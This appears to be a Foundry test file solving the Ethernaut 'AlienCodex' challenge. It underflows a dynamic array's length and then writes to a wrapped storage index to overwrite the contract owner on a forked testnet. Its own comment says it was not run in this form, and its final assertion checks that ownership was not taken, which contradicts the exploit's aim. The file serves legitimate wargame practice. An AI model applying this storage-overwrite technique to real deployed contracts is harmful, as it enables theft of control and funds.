// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {AlienCodex} from "../../src/Ethernaut/AlienCodex.sol";

// 安装的foundry最低也支持不到0.5.0的版本，所以这题不实际在这跑了，但思路是这里的思路，直接到remix部署过关了。
contract AlienCodexAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;

        vm.startPrank(playerAddress);
        AlienCodex alienCodex = AlienCodex(
            0x20ab600D022892184A46F73Dc6af92733f83FEAe
        );
        alienCodex.makeContact();
        alienCodex.retract();
        uint256 index = UINT256_MAX - uint256(keccak256(abi.encode(1))) + 1;
        alienCodex.revise(index, bytes32(uint256(uint160(playerAddress))));
        vm.stopPrank();
        assertFalse(alienCodex.owner() == playerAddress);
    }
}
